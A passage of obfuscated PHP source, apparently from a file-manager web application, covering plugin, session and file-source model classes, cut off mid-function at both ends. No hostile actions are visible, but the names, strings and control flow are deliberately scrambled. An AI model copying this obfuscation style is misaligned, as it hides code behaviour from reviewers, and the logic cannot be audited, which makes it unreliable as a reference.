$c‘„ô—åŠ[$F…Ù‡Ïè¼»] . $bøÊ‚ñ•Ñ”[8]; } if ($D«Ğ‰­ªÁ‚) { $b‹‡“¢‡ .= $bòìÃïŞÈ[$bøÊ‚ñ•Ñ”[28]]; } $bòìÃïŞÈ[$bøÊ‚ñ•Ñ”[459]] = str_replace($bøÊ‚ñ•Ñ”[463], $bøÊ‚ñ•Ñ”[8], $b‹‡“¢‡); } goto d†ÀÊ†¶ ì; e¶âñ‹™ª: $Eêá²÷¾ À = array(); foreach ($c‘„ô—åŠ as $f‘‰ êêÎ¼ => $aÖÒîİëÀ÷) { if (!$aÖÒîİëÀ÷) { $Eêá²÷¾ À[] = $f‘‰ êêÎ¼; } } if ($Eêá²÷¾ À) { $F¥‰÷•’Û“ = array($bøÊ‚ñ•Ñ”[2144] => array($bøÊ‚ñ•Ñ”[380], $Eêá²÷¾ À)); $díÆ•™ÔÀ = $this->field($bøÊ‚ñ•Ñ”[2157])->where($F¥‰÷•’Û“)->select(); $AÄçˆèÏ˜Ï = array_to_keyvalue($díÆ•™ÔÀ, $bøÊ‚ñ•Ñ”[2072], $bøÊ‚ñ•Ñ”[28]); $c‘„ô—åŠ = array_merge_index($c‘„ô—åŠ, $AÄçˆèÏ˜Ï); } goto C¤ĞÏ»è¶; e¶£„±‘ö: $bøÊ‚ñ•Ñ” =& $_SERVER[»„]; $c‘„ô—åŠ = array(); foreach ($fÖ­ÔØ”õ¯ as &$bòìÃïŞÈ) { $c‘„ô—åŠ[$bòìÃïŞÈ[$bøÊ‚ñ•Ñ”[2072]]] = $bòìÃïŞÈ[$bøÊ‚ñ•Ñ”[28]]; $D«Ğ‰­ªÁ‚ = $this->parentLevelArray($bòìÃïŞÈ[$bøÊ‚ñ•Ñ”[455]]); foreach ($D«Ğ‰­ªÁ‚ as $F…Ù‡Ïè¼») { if (!isset($c‘„ô—åŠ[$F…Ù‡Ïè¼»])) { $c‘„ô—åŠ[$F…Ù‡Ïè¼»] = 0; } } } goto e¶âñ‹™ª; d†ÀÊ†¶ ì: } private function _listAppendSourceRoot(&$Aã­³•¢òˆ, $cˆ—Ì±ñù˜) { goto d®Ì•À•…Ü; Bùñç›¢öç: foreach ($Aã­³•¢òˆ as &$C¾±¥‘ñ¦) { $C¾±¥‘ñ¦[$DÍ˜æ§‰íÖ[387]] = $F¼éÁÔ™®Ö[$C¾±¥‘ñ¦[$DÍ˜æ§‰íÖ[2072]]] ? $F¼éÁÔ™®Ö[$C¾±¥‘ñ¦[$DÍ˜æ§‰íÖ[2072]]] : array(); } goto Eçš¼Ó‘Õ; E¾Æ’áĞ‹: $F¼éÁÔ™®Ö = Model($DÍ˜æ§‰íÖ[740])->order($DÍ˜æ§‰íÖ[2159])->field($B ¢ö‹‹Ç±)->where($B”øˆˆÁåù)->select(); $F¼éÁÔ™®Ö = array_to_keyvalue($F¼éÁÔ™®Ö, $DÍ˜æ§‰íÖ[452]); $F¼éÁÔ™®Ö = array_remove_key($F¼éÁÔ™®Ö, $DÍ˜æ§‰íÖ[452]); goto Bùñç›¢öç; d®Ì•À•…Ü: $DÍ˜æ§‰íÖ =& $_SERVER[»„]; $B”øˆˆÁåù = array($DÍ˜æ§‰íÖ[367] => SourceModel::TYPE_GROUP, $DÍ˜æ§‰íÖ[457] => 0, $DÍ˜æ§‰íÖ[452] => array($DÍ˜æ§‰íÖ[7], $cˆ—Ì±ñù˜)); $B ¢ö‹‹Ç± = $DÍ˜æ§‰íÖ[2158]; goto E¾Æ’áĞ‹; Eçš¼Ó‘Õ: } protected function resetParentLevel() { $CÈƒÂµ™ƒå =& $_SERVER[»„]; $A¯•¥‡§ˆ¹ = $CÈƒÂµ™ƒå[2072]; $b”øˆ¥òĞ‹ = $this->select(); $b”øˆ¥òĞ‹ = array_to_keyvalue($b”øˆ¥òĞ‹, $A¯•¥‡§ˆ¹); foreach ($b”øˆ¥òĞ‹ as $E¡øèÏ»¼Ç) { goto b¹î¯›çö; cö‹¯ëï²÷: $CÉ³²áçÊ÷[] = 0; $CÉ³²áçÊ÷ = $CÈƒÂµ™ƒå[47] . implode($CÈƒÂµ™ƒå[47], array_reverse($CÉ³²áçÊ÷)) . $CÈƒÂµ™ƒå[47]; $this->setNamePinyin($E¡øèÏ»¼Ç[$A¯•¥‡§ˆ¹], $E¡øèÏ»¼Ç[$CÈƒÂµ™ƒå[28]]); goto f‰Ä“Ó—ó; f‰Ä“Ó—ó: $this->where(array($A¯•¥‡§ˆ¹ => $E¡øèÏ»¼Ç[$A¯•¥‡§ˆ¹]))->save(array($CÈƒÂµ™ƒå[521] => $CÉ³²áçÊ÷)); goto E­õ‰‹Áš‰; b¹î¯›çö: $A»•Ó†Á½‹ = $E¡øèÏ»¼Ç; $CÉ³²áçÊ÷ = array(); while ($A»•Ó†Á½‹[$CÈƒÂµ™ƒå[457]] != 0) { $CÉ³²áçÊ÷[] = $A»•Ó†Á½‹[$CÈƒÂµ™ƒå[457]]; $A»•Ó†Á½‹ = $b”øˆ¥òĞ‹[$A»•Ó†Á½‹[$CÈƒÂµ™ƒå[457]]]; } goto cö‹¯ëï²÷; E­õ‰‹Áš‰: } return $b”øˆ¥òĞ‹; } public function groupNameAuto($EŠ¨‹Æ¶, $e…»‘Š‡ƒà) { $cáçŠ´É Ü =& $_SERVER[»„]; $E§âÕ•ôÛê = $this->where(array($cáçŠ´É Ü[364] => $EŠ¨‹Æ¶))->getField($cáçŠ´É Ü[28], !0); if (!$E§âÕ•ôÛê || !in_array($e…»‘Š‡ƒà, $E§âÕ•ôÛê)) { return $e…»‘Š‡ƒà; } for ($a¸Îƒçõ = 1; $a¸Îƒçõ <= count($E§âÕ•ôÛê) + 1; $a¸Îƒçõ++) { $béÉƒÒæöé = $e…»‘Š‡ƒà . "\x28{$a¸Îƒçõ}\51"; if (!in_array($béÉƒÒæöé, $E§âÕ•ôÛê)) { return $béÉƒÒæöé; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\160\x6c\x75\x67\x69\x6e\114\x69\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x73\x74\x61\164\165\x73", "\x72\145\147\x69\x65\163\x74", "\143\x6f\156\146\x69\147"); public function loadList($c™Š£Äµéô = false) { $dí³†«–óÕ = array_to_keyvalue($this->listData(), $_SERVER[»„][28]); if ($c™Š£Äµéô) { return $dí³†«–óÕ[$c™Š£Äµéô]; } return $dí³†«–óÕ; } public function init() { $fµ¶Ş¡é =& $_SERVER[»„]; Hook::trigger($fµ¶Ş¡é[2160]); $eÛ”†Á”âö = $this->loadPluginList(); foreach ($eÛ”†Á”âö as $fáõ‡ŠëÊ => $AÎÌÇ™ŠÍ—) { $aè’ÇÌš = $this->appAllow($fáõ‡ŠëÊ, $AÎÌÇ™ŠÍ—); if (!$aè’ÇÌš) { continue; } foreach ($AÎÌÇ™ŠÍ—[$fµ¶Ş¡é[2161]] as $AÁŠ”íš†· => $A‹¼Â„éõŞ) { Hook::bind($AÁŠ”íš†·, $A‹¼Â„éõŞ); } } Hook::trigger($fµ¶Ş¡é[2162]); Hook::trigger(ACTION); } public function appAllow($c¢ùÍ˜ô¿, $cîÁ»ÌÔ÷Ó, $AäîÒˆ­Ù” = true) { $C¸‰Õ„Ã…Ë =& $_SERVER[»„]; $Fß××éÇ‡˜ = PLUGIN_DIR . $c¢ùÍ˜ô¿ . $C¸‰Õ„Ã…Ë[2163]; if (!is_array($cîÁ»ÌÔ÷Ó) || !is_array($cîÁ»ÌÔ÷Ó[$C¸‰Õ„Ã…Ë[2161]]) || !is_file($Fß××éÇ‡˜) || $cîÁ»ÌÔ÷Ó[$C¸‰Õ„Ã…Ë[677]] != 1) { return !1; } if ($AäîÒˆ­Ù” && !Action($C¸‰Õ„Ã…Ë[2164])->checkAuth($c¢ùÍ˜ô¿)) { return !1; } return !0; } public function unInstall($d¨ÈáçâŞ) { $dëæÄ²Œ¾ =& $_SERVER[»„]; $B¬¤¸†ˆä° = $this->loadList($d¨ÈáçâŞ); if (file_exists(PLUGIN_DIR . $d¨ÈáçâŞ)) { Hook::apply($d¨ÈáçâŞ . $dëæÄ²Œ¾[2165]); } $this->remove($B¬¤¸†ˆä°[$dëæÄ²Œ¾[363]]); } public function changeStatus($eÃ¯–òÒ±¤, $dˆØ¤ÎåğÉ) { $bç•Œ”Ù” =& $_SERVER[»„]; $Céø»ÎÊ‹ = $this->loadList($eÃ¯–òÒ±¤); if ($dˆØ¤ÎåğÉ) { Hook::apply($eÃ¯–òÒ±¤ . $bç•Œ”Ù”[2166]); } $this->update($Céø»ÎÊ‹[$bç•Œ”Ù”[363]], array($bç•Œ”Ù”[2167] => $dˆØ¤ÎåğÉ)); } public function appRegist($Bù¶ğáœâø, $cÁ™ó©Ä¶Û) { $bÑ˜áİÂˆ† =& $_SERVER[»„]; $Cˆ°÷Ìœ¸ç = $this->loadList($Bù¶ğáœâø); if ($Cˆ°÷Ìœ¸ç) { $this->update($Cˆ°÷Ìœ¸ç[$bÑ˜áİÂˆ†[363]], array($bÑ˜áİÂˆ†[2161] => $cÁ™ó©Ä¶Û)); } else { $F¶Á®„Œ = array($bÑ˜áİÂˆ†[28] => $Bù¶ğáœâø, $bÑ˜áİÂˆ†[2161] => $cÁ™ó©Ä¶Û, $bÑ˜áİÂˆ†[677] => 0, $bÑ˜áİÂˆ†[6] => $this->getConfigDefault($Bù¶ğáœâø)); $this->insert($F¶Á®„Œ); } } public function getConfigDefault($f¸ì‚ÌŞïÕ) { $E†“›”¾Õ =& $_SERVER[»„]; $Dñáè¬Ô¯Œ = array(); $eê»Ø‡ Ç = $this->getPackageJson($f¸ì‚ÌŞïÕ); if (!$eê»Ø‡ Ç && is_array($eê»Ø‡ Ç[$E†“›”¾Õ[2168]])) { return $Dñáè¬Ô¯Œ; } foreach ($eê»Ø‡ Ç[$E†“›”¾Õ[2168]] as $D¶ÆÇ›˜¡ => $F³³ —­Ï) { if (!isset($F³³ —­Ï[$E†“›”¾Õ[355]]) || isset($Dñáè¬Ô¯Œ[$D¶ÆÇ›˜¡])) { continue; } $Dñáè¬Ô¯Œ[$D¶ÆÇ›˜¡] = $F³³ —­Ï[$E†“›”¾Õ[355]]; } return $Dñáè¬Ô¯Œ; } public function getPackageJson($b†ƒ­Ï’») { return Hook::apply($b†ƒ­Ï’» . $_SERVER[»„][2169]); } public function getConfig($a¬ÒèÆ©ø, $CóğóÏœ‰³ = false) { $Eœõ¬è­Â =& $_SERVER[»„]; $BÎ•ë¦öçÊ = array(); $d„½¦•¦ß = $this->loadList($a¬ÒèÆ©ø); if ($d„½¦•¦ß && is_array($d„½¦•¦ß[$Eœõ¬è­Â[6]])) { $BÎ•ë¦öçÊ = $d„½¦•¦ß[$Eœõ¬è­Â[6]]; } if (!$BÎ•ë¦öçÊ || $CóğóÏœ‰³) { $BÎ•ë¦öçÊ = $this->getConfigDefault($a¬ÒèÆ©ø); } return $BÎ•ë¦öçÊ; } public function setConfig($Aù´´©‚¨, $cæ–ÙÕ³Œ = false) { goto D×·Í—£µ; A­«¾ ±É«: if ($cæ–ÙÕ³Œ == !1) { $cæ–ÙÕ³Œ = $this->getConfigDefault($Aù´´©‚¨); } $f–Ä¿àÆÔõ = $E¹æ…Ùœ¥[$b•Ä«ğ¶«´[6]]; foreach ($cæ–ÙÕ³Œ as $C¹—ó¤Àé× => $CÚÑêô©ƒ) { $f–Ä¿àÆÔõ[$C¹—ó¤Àé×] = is_string($CÚÑêô©ƒ) ? trim($CÚÑêô©ƒ) : $CÚÑêô©ƒ; } goto E¢…Ò°Ò¼ä; E¢…Ò°Ò¼ä: $this->update($E¹æ…Ùœ¥[$b•Ä«ğ¶«´[363]], array($b•Ä«ğ¶«´[6] => $f–Ä¿àÆÔõ)); goto AŞÏ™Ë¿¢À; D×·Í—£µ: $b•Ä«ğ¶«´ =& $_SERVER[»„]; $E¹æ…Ùœ¥ = $this->loadList($Aù´´©‚¨); if (!$E¹æ…Ùœ¥) { return !1; } goto A­«¾ ±É«; AŞÏ™Ë¿¢À: } public function viewList() { goto DŸ·±‘; f¢ÛÇ¸Ô¦©: return $dĞË«™ªãŒ; goto Fœ¹³‚á˜; DŸ·±‘: $dåé¯Ãç³­ =& $_SERVER[»„]; $BÊ‚Ë‹Ô‘¤ = $this->loadList(); $this->pluginScan($BÊ‚Ë‹Ô‘¤); goto DŒ¡ÊÀÈ‡…; DŒ¡ÊÀÈ‡…: $BÊ‚Ë‹Ô‘¤ = $this->loadPluginList(); $dĞË«™ªãŒ = array(); foreach ($BÊ‚Ë‹Ô‘¤ as $E°ïæ¥âÚµ => $Aå¨ËŞâ»•) { unset($Aå¨ËŞâ»•[$dåé¯Ãç³­[2161]], $Aå¨ËŞâ»•[$dåé¯Ãç³­[6]]); $cÑğù¯öÛ = PLUGIN_DIR . $Aå¨ËŞâ»•[$dåé¯Ãç³­[28]] . $dåé¯Ãç³­[2163]; if (!is_file($cÑğù¯öÛ)) { continue; } $F§Óª´µŞà = Hook::apply($Aå¨ËŞâ»•[$dåé¯Ãç³­[28]] . $dåé¯Ãç³­[2169]); if (is_array($F§Óª´µŞà)) { $dĞË«™ªãŒ[$E°ïæ¥âÚµ] = array_merge($Aå¨ËŞâ»•, $F§Óª´µŞà); } } goto f¢ÛÇ¸Ô¦©; Fœ¹³‚á˜: } private function loadPluginList() { $B†¼…Õù” =& $_SERVER[»„]; $c°Äî»±·† = $this->loadList(); if (strtolower(MOD) == $B†¼…Õù”[2170]) { return $c°Äî»±·†; } $fÜ«ßëˆÛ© = Hook::trigger($B†¼…Õù”[2171], $c°Äî»±·†); if ($c°Äî»±·† && !$fÜ«ßëˆÛ©) { die; } return $fÜ«ßëˆÛ© ? $fÜ«ßëˆÛ© : $c°Äî»±·†; } private function pluginScan($b˜Õä¥éÖÂ) { $CìŒÌ×ìÖÇ =& $_SERVER[»„]; recursion_dir(PLUGIN_DIR, $FØ¬Ë²Ï°®, $A«‘’»¡ î, 0); foreach ($FØ¬Ë²Ï°® as $A×·„Ş‡ÒĞ) { $EÖ×»™ë›Í = get_path_this($A×·„Ş‡ÒĞ); if (isset($b˜Õä¥éÖÂ[$EÖ×»™ë›Í]) || !file_exists($A×·„Ş‡ÒĞ . $CìŒÌ×ìÖÇ[2172]) || !file_exists($A×·„Ş‡ÒĞ . $CìŒÌ×ìÖÇ[2163])) { continue; } Hook::apply($EÖ×»™ë›Í . $CìŒÌ×ìÖÇ[2166]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\145\x6d\137\163\x65\x73\163\151\x6f\156"; public function get($dÁ——®ÄŒ ) { $A„êç¹ê»à =& $_SERVER[»„]; $C›ÂÍ– ­© = $this->where(array($A„êç¹ê»à[2173] => $dÁ——®ÄŒ ))->find(); if (!is_array($C›ÂÍ– ­©)) { return !1; } return $C›ÂÍ– ­©[$A„êç¹ê»à[680]]; } public function set($cÀÌ²ªÌ‹ƒ, $EÔË ¤êÕ, $fÛÛ ª¯‰ = 3600) { $Dª®ê¯Ùë‡ =& $_SERVER[»„]; $f©‹¼¡ŒÀÁ = array($Dª®ê¯Ùë‡[2173] => $cÀÌ²ªÌ‹ƒ, $Dª®ê¯Ùë‡[2102] => $EÔË ¤êÕ, $Dª®ê¯Ùë‡[2174] => $fÛÛ ª¯‰ + time()); if (Session::get($Dª®ê¯Ùë‡[2175])) { $f©‹¼¡ŒÀÁ[$Dª®ê¯Ùë‡[1409]] = Session::get($Dª®ê¯Ùë‡[2175]); } else { $f©‹¼¡ŒÀÁ[$Dª®ê¯Ùë‡[1409]] = 0; } if ($this->get($cÀÌ²ªÌ‹ƒ)) { return $this->where(array($Dª®ê¯Ùë‡[2173] => $cÀÌ²ªÌ‹ƒ))->save($f©‹¼¡ŒÀÁ); } else { return $this->add($f©‹¼¡ŒÀÁ, array(), !0); } } public function remove($dˆ¤ ²ëÛä) { return $this->where(array($_SERVER[»„][2173] => $dˆ¤ ²ëÛä))->delete(); } public function clearTimeout() { return $this->where($_SERVER[»„][2176] . time())->delete(); } } goto f¨´äÔÃ; B’Û±Ì›È: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\x72\x63\145"; protected $tableMeta = array("\x74\x61\142\154\145\116\141\155\x65" => "\x69\157\137\163\x6f\165\162\x63\145\x5f\155\x65\164\x61", "\155\145\x74\x61\106\151\x65\154\x64" => "\163\157\x75\162\143\145\x49\104"); protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\124\151\155\145", "\x74\151\155\x65", "\x69\156\x73\145\x72\164", "\146\165\156\143\x74\151\157\156"), array("\143\x72\145\x61\164\145\124\x69\x6d\x65", "\x74\151\155\x65", "\x69\156\x73\145\x72\x74", "\146\x75\156\143\164\x69\157\156"), array("\166\x69\145\167\124\x69\155\x65", "\x74\151\x6d\145", "\151\x6e\163\145\x72\x74", "\x66\165\156\143\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($D¤ª¢²å¢„) { return $this->listSource(array($_SERVER[»„][364] => $D¤ª¢²å¢„)); } public function typeName($B¨»¹Œ) { static $BÊá™ÓöÔ = array(self::TYPE_SYSTEM => "\163\171\x73\x74\x65\x6d", self::TYPE_USER => "\165\163\x65\x72", self::TYPE_GROUP => "\147\162\x6f\165\x70"); return $BÊá™ÓöÔ[$B¨»¹Œ . $_SERVER[»„][33]]; } public function sourceListInfo($bÁÖÄ¿Íºø, $e²ªèÙ = false) { goto CÍ¨ÓêÃˆ¸; D–ÇØ´³ê¼: if (!$bÁÖÄ¿Íºø) { return array(); } $e©Í‘‡°ª½ = $this->where(array($AàÁ–Ã¨°[365] => array($AàÁ–Ã¨°[7], $bÁÖÄ¿Íºø)))->select(); $this->_listDataApply($e©Í‘‡°ª½, $e²ªèÙ); goto aÚ½Ù„¿Ø; CÍ¨ÓêÃˆ¸: $AàÁ–Ã¨° =& $_SERVER[»„]; $bÁÖÄ¿Íºø = $bÁÖÄ¿Íºø ? $bÁÖÄ¿Íºø : array(); $bÁÖÄ¿Íºø = array_filter(array_unique($bÁÖÄ¿Íºø)); goto D–ÇØ´³ê¼; aÚ½Ù„¿Ø: return array_to_keyvalue($e©Í‘‡°ª½, $AàÁ–Ã¨°[365]); goto D­¥ò‘“ô; D­¥ò‘“ô: } public function pathInfoFilter($cã×˜—ÏƒÑ) { goto C¢Ó¢šùèÕ; B¸ìö‰š©±: $cã×˜—ÏƒÑ[$EÙ’· Óß„[367]] = $this->typeName($cã×˜—ÏƒÑ[$EÙ’· Óß„[367]]); if ($cã×˜—ÏƒÑ[$EÙ’· Óß„[366]] != 1) { $cã×˜—ÏƒÑ[$EÙ’· Óß„[156]] = $cã×˜—ÏƒÑ[$EÙ’· Óß„[368]]; unset($cã×˜—ÏƒÑ[$EÙ’· Óß„[368]]); } $fÈ†‰«ˆ‹İ = $EÙ’· Óß„[369]; goto BØØŒ”Ú´×; C¢Ó¢šùèÕ: $EÙ’· Óß„ =& $_SERVER[»„]; $cã×˜—ÏƒÑ[$EÙ’· Óß„[75]] = KodIO::make($cã×˜—ÏƒÑ[$EÙ’· Óß„[365]]); $cã×˜—ÏƒÑ[$EÙ’· Óß„[29]] = $cã×˜—ÏƒÑ[$EÙ’· Óß„[366]] == 1 ? $EÙ’· Óß„[76] : $EÙ’· Óß„[163]; goto B¸ìö‰š©±; BØØŒ”Ú´×: $fÈ†‰«ˆ‹İ .= $EÙ’· Óß„[370]; $fÈ†‰«ˆ‹İ .= $EÙ’· Óß„[371]; $BßùëºÑ†÷ = explode($EÙ’· Óß„[47], $fÈ†‰«ˆ‹İ); goto FóƒÏ´—; FóƒÏ´—: if (isset($cã×˜—ÏƒÑ[$EÙ’· Óß„[372]]) && $cã×˜—ÏƒÑ[$EÙ’· Óß„[372]][$EÙ’· Óß„[373]] == -1) { $BßùëºÑ†÷ = array_remove_value($BßùëºÑ†÷, $EÙ’· Óß„[183]); $BßùëºÑ†÷ = array_remove_value($BßùëºÑ†÷, $EÙ’· Óß„[106]); $BßùëºÑ†÷ = array_remove_value($BßùëºÑ†÷, $EÙ’· Óß„[374]); $BßùëºÑ†÷ = array_remove_value($BßùëºÑ†÷, $EÙ’· Óß„[375]); $BßùëºÑ†÷ = array_remove_value($BßùëºÑ†÷, $EÙ’· Óß„[77]); $BßùëºÑ†÷ = array_remove_value($BßùëºÑ†÷, $EÙ’· Óß„[376]); } $cã×˜—ÏƒÑ = array_field_key($cã×˜—ÏƒÑ, $BßùëºÑ†÷); return $cã×˜—ÏƒÑ; goto e´ØÜÊîÔ; e´ØÜÊîÔ: } public function listUserFav() { goto a³íõÎÀÑ·; eÖğìªšâÏ: $E÷ò…¢†—© = array_to_keyvalue($E÷ò…¢†—©, $E¬ìçÅî‚¶[33], $E¬ìçÅî‚¶[75]); if ($E÷ò…¢†—©) { $A®³Å“ù¸ = $this->listSource(array($E¬ìçÅî‚¶[379] => array($E¬ìçÅî‚¶[380], $E÷ò…¢†—©))); } $A®³Å“ù¸ = array_to_keyvalue($A®³Å“ù¸[$E¬ìçÅî‚¶[350]], $E¬ìçÅî‚¶[365]); goto eÜÄ›ÕœÓ¥; eÜÄ›ÕœÓ¥: foreach ($D‰ÒËÒÀ¡Ş as &$Eô¨ï°„Ü) { $Eô¨ï°„Ü = array($E¬ìçÅî‚¶[381] => $Eô¨ï°„Ü[$E¬ìçÅî‚¶[363]], $E¬ìçÅî‚¶[382] => $Eô¨ï°„Ü[$E¬ìçÅî‚¶[28]], $E¬ìçÅî‚¶[383] => $Eô¨ï°„Ü[$E¬ìçÅî‚¶[75]], $E¬ìçÅî‚¶[384] => $Eô¨ï°„Ü[$E¬ìçÅî‚¶[29]], $E¬ìçÅî‚¶[385] => $Eô¨ï°„Ü[$E¬ìçÅî‚¶[183]], $E¬ìçÅî‚¶[386] => $Eô¨ï°„Ü[$E¬ìçÅî‚¶[106]]); if ($Eô¨ï°„Ü[$E¬ìçÅî‚¶[29]] == $E¬ìçÅî‚¶[378] && $A®³Å“ù¸[$Eô¨ï°„Ü[$E¬ìçÅî‚¶[75]]]) { $Eô¨ï°„Ü[$E¬ìçÅî‚¶[387]] = $A®³Å“ù¸[$Eô¨ï°„Ü[$E¬ìçÅî‚¶[75]]]; } } return $D‰ÒËÒÀ¡Ş; goto fçµšµ¯î; a³íõÎÀÑ·: $E¬ìçÅî‚¶ =& $_SERVER[»„]; $D‰ÒËÒÀ¡Ş = Model($E¬ìçÅî‚¶[377])->listData(); $E÷ò…¢†—© = array_filter_by_field($D‰ÒËÒÀ¡Ş, $E¬ìçÅî‚¶[29], $E¬ìçÅî‚¶[378]); goto eÖğìªšâÏ; fçµšµ¯î: } public function listUserTag($bÜ’à¥†) { goto AæèÈä¹õ; dÛÆ¡—£ÒË: $this->listUserTagClear($fñ½–íØ¼©, $FİçÈÂ‘‹, $bÜ’à¥†); return $FİçÈÂ‘‹; goto eÀœ„¢êõà; AæèÈä¹õ: $D¶²‚Œ‚ =& $_SERVER[»„]; $b¬â˜›°º‹ = Model($D¶²‚Œ‚[388])->listData(); $fñ½–íØ¼© = array_filter_by_field($b¬â˜›°º‹, $D¶²‚Œ‚[389], $bÜ’à¥†); goto B¼§ˆ†ÚšŒ; B¼§ˆ†ÚšŒ: $fñ½–íØ¼© = array_to_keyvalue($fñ½–íØ¼©, $D¶²‚Œ‚[33], $D¶²‚Œ‚[75]); $FİçÈÂ‘‹ = array(); if ($fñ½–íØ¼©) { $dÎ‹ˆŞôøØ = array($D¶²‚Œ‚[379] => array($D¶²‚Œ‚[380], $fñ½–íØ¼©)); $FİçÈÂ‘‹ = $this->listSource($dÎ‹ˆŞôøØ); } goto dÛÆ¡—£ÒË; eÀœ„¢êõà: } private function listUserTagClear($FèÄ¢ø’, $CË²±„—á´, $aŠŒç÷¥Ø¦) { goto D—ó©ˆ«ğ†; C‹«ñÒ‚‡Š: $AñÊŠ‘˜Î– = array(); $CëÛí»Åø‰ = array_to_keyvalue($CË²±„—á´[$EÄƒŸËÌƒª[74]], $EÄƒŸËÌƒª[33], $EÄƒŸËÌƒª[365]); $d Œ÷ôµ¸Ô = array_to_keyvalue($CË²±„—á´[$EÄƒŸËÌƒª[73]], $EÄƒŸËÌƒª[33], $EÄƒŸËÌƒª[365]); goto A¹ƒ†•ñÏÎ; dâ•¨¢†: Model($EÄƒŸËÌƒª[390])->removeFromTag($AñÊŠ‘˜Î–, $aŠŒç÷¥Ø¦); goto aµÃ˜†î; D—ó©ˆ«ğ†: $EÄƒŸËÌƒª =& $_SERVER[»„]; if (!$FèÄ¢ø’) { return; } if ($CË²±„—á´ && count($FèÄ¢ø’) == $CË²±„—á´[$EÄƒŸËÌƒª[347]][$EÄƒŸËÌƒª[348]]) { return; } goto C‹«ñÒ‚‡Š; A¹ƒ†•ñÏÎ: $c«’ÙËÚ´† = array_merge($d Œ÷ôµ¸Ô, $CëÛí»Åø‰); foreach ($FèÄ¢ø’ as $c°…¬‡ô¸Ó) { if (!in_array($c°…¬‡ô¸Ó, $c«’ÙËÚ´†)) { $AñÊŠ‘˜Î–[] = $c°…¬‡ô¸Ó; } } if (!$AñÊŠ‘˜Î–) { return; } goto dâ•¨¢†; aµÃ˜†î: } public function listUserRecycle() { $eŒ‘†µ“Û† =& $_SERVER[»„]; $a“ÆÉÂá¹ö = Model($eŒ‘†µ“Û†[391])->listData(); if (!$a“ÆÉÂá¹ö) { return array(); } $E•´œßæï£ = array($eŒ‘†µ“Û†[379] => array($eŒ‘†µ“Û†[380], $a“ÆÉÂá¹ö), $eŒ‘†µ“Û†[392] => 1); return $this->listSource($E•´œßæï£); } public function listSource($d’‘ÙÉ‹¯¯, $a»Á´íË‰ = 3000) { goto B×¿òÌÊ›¢; eõÂå¬©ƒØ: $D‡Œè¨¦ÇÕ = $this->field($D¼’á«ˆöê)->_makeOrder()->where($d’‘ÙÉ‹¯¯)->selectPage($a»Á´íË‰); $this->_listDataApply($D‡Œè¨¦ÇÕ[$DÄ°§÷©³ß[350]]); $this->_listMake($D‡Œè¨¦ÇÕ); goto b Š†—–«; B×¿òÌÊ›¢: $DÄ°§÷©³ß =& $_SERVER[»„]; if (!isset($d’‘ÙÉ‹¯¯[$DÄ°§÷©³ß[393]])) { $d’‘ÙÉ‹¯¯[$DÄ°§÷©³ß[393]] = 0; } $D¼’á«ˆöê = $DÄ°§÷©³ß[394]; goto eõÂå¬©ƒØ; b Š†—–«: return $D‡Œè¨¦ÇÕ; goto FÉ»×ÁóŞ; FÉ»×ÁóŞ: } protected function _makeOrder() { goto a‰‘ Â¨äŒ; C‹Ôš –¬Ï: if ($f²­¤ƒ‰ï’ == $DŒòñ˜Å‰í[28]) { } $E õ¬éÙÜé = $DŒòñ˜Å‰í[405] . $Dá˜œ¾Ù¿[$f²­¤ƒ‰ï’] . $DŒòñ˜Å‰í[50] . $DƒòÍ³ùó®[$FÂàù†°§§]; return $this->order(rtrim(trim($E õ¬éÙÜé), $DŒòñ˜Å‰í[47])); goto b“Û©î­ò˜; fÁ –ñƒÁ¶: $FÂàù†°§§ = Input::get($DŒòñ˜Å‰í[404], $DŒòñ˜Å‰í[7], $CÖ›ƒ¯›¬, array_keys($DƒòÍ³ùó®)); if (!in_array($f²­¤ƒ‰ï’, array_keys($Dá˜œ¾Ù¿))) { $f²­¤ƒ‰ï’ = $DŒòñ˜Å‰í[28]; } if (!in_array($FÂàù†°§§, array_keys($DƒòÍ³ùó®))) { $f²­¤ƒ‰ï’ = $DŒòñ˜Å‰í[398]; } goto C‹Ôš –¬Ï; Dëğ¾‚Í ¿: $DƒòÍ³ùó® = array($DŒòñ˜Å‰í[398] => $DŒòñ˜Å‰í[399], $DŒòñ˜Å‰í[400] => $DŒòñ˜Å‰í[401]); $Dá˜œ¾Ù¿ = array($DŒòñ˜Å‰í[28] => $DŒòñ˜Å‰í[28], $DŒòñ˜Å‰í[77] => $DŒòñ˜Å‰í[77], $DŒòñ˜Å‰í[156] => $DŒòñ˜Å‰í[368], $DŒòñ˜Å‰í[374] => $DŒòñ˜Å‰í[374], $DŒòñ˜Å‰í[402] => $DŒòñ˜Å‰í[375], $DŒòñ˜Å‰í[183] => $DŒòñ˜Å‰í[183], $DŒòñ˜Å‰í[106] => $DŒòñ˜Å‰í[106]); $f²­¤ƒ‰ï’ = Input::get($DŒòñ˜Å‰í[403], $DŒòñ˜Å‰í[7], $c¥ã·™ï’µ, array_keys($Dá˜œ¾Ù¿)); goto fÁ –ñƒÁ¶; a‰‘ Â¨äŒ: $DŒòñ˜Å‰í =& $_SERVER[»„]; $c¥ã·™ï’µ = Model($DŒòñ˜Å‰í[395])->get($DŒòñ˜Å‰í[396]); $CÖ›ƒ¯›¬ = Model($DŒòñ˜Å‰í[395])->get($DŒòñ˜Å‰í[397]); goto Dëğ¾‚Í ¿; b“Û©î­ò˜: } protected function _listDataApplyItem($aµ ÈÎ, $Aæ÷°®Ó¨ = false) { $cœ÷ŒÖáê¯ = array($aµ ÈÎ); $this->_listDataApply($cœ÷ŒÖáê¯, $Aæ÷°®Ó¨); return $cœ÷ŒÖáê¯[0]; } protected function _listDataApply(&$a–¯›İìî, $Eá±ÑÌ”áë = false) { goto AŸÃÊæ¸ù¥; AŸÃÊæ¸ù¥: $EÉ÷—Ÿ©ßÙ =& $_SERVER[»„]; if (!$a–¯›İìî) { $a–¯›İìî = array(); return; } $BëÙÆÎ÷“¾ = array_to_keyvalue($a–¯›İìî, $EÉ÷—Ÿ©ßÙ[33], $EÉ÷—Ÿ©ßÙ[365]); goto 